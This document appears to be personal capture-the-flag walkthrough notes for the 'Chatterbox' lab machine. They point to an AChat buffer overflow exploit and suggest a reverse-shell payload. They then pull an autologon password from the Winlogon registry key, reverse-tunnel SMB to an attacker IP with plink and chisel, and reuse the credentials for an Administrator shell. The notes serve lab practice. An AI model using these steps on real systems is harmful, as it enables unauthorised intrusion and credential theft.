


```
kali@kali ~> searchsploit -w AChat
------------------------------------------------------------ --------------------------------------------
 Exploit Title                                              |  URL
------------------------------------------------------------ --------------------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                  | https://www.exploit-db.com/exploits/36025   <-------------- works the best
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)     | https://www.exploit-db.com/exploits/36056
{...SNIP...}
{...SNIP...}
------------------------------------------------------------ --------------------------------------------
Shellcodes: No Results

```



change shellcode to the meterpreter reverse shell or whatver you want





# PrivEsc


```powershell
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!     <-------------------------------------- look here

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked

```


so we have a password and we are going to use port forwarding to be able to login ig?


## Using Plink

```
plink.exe -l <any_username> -pw <any_password> -R <port>:127.0.0.1:<port> <ATTACKER_IP_HERE>
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.29
```



## Using chisel cuz its much easier


on attacker machine

```powershell
kali@kali ~> ./chisel server -p 80 --reverse
2024/06/13 10:26:39 server: Reverse tunnelling enabled
2024/06/13 10:26:39 server: Fingerprint t3hhs+cI3MdMp4Vdq3xeaQFmzkMZL9xwuo93+9LKI3o=
2024/06/13 10:26:39 server: Listening on http://0.0.0.0:80
2024/06/13 10:27:29 server: session#1: Client version (1.9.1) differs from server version (0.0.0-src)
2024/06/13 10:27:29 server: session#1: tun: proxy#R:445=>445: Listening

```

On victim machine
```powershell
C:\tmp>.\chisel.exe client 10.10.14.29:80 R:445:127.0.0.1:445
.\chisel.exe client 10.10.14.29:80 R:445:127.0.0.1:445
2024/06/13 15:27:28 client: Connecting to ws://10.10.14.29:80
2024/06/13 15:27:29 client: Connected (Latency 119.0068ms)

```


Now I can either use NXC or WINEXE to check, now what we basically have done is that we have hooked the closed SMB port on the machine to **OUR** local machine, so now we can interact with the SMB machine that is on the box  


on attacker machine
```powershell
kali@kali ~> nxc smb 0.0.0.0 -u 'Administrator' -p 'Welcome1!'
SMB         0.0.0.0         445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         0.0.0.0         445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)  <-------------- credentials are working
```


```powershell
kali@kali ~> winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```


---


# method 2

checking the permissions icacls

```
C:\Users\Administrator\Desktop>dir /Q
dir /Q
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          BUILTIN\Administrators .
12/10/2017  07:50 PM    <DIR>          NT AUTHORITY\SYSTEM    ..
06/13/2024  02:39 AM                34 CHATTERBOX\Alfred      root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,671,932,928 bytes free

```




---

# method 3 




---

Remember that 

`psexec`
`smbexec`
`wmiexec`

also all exist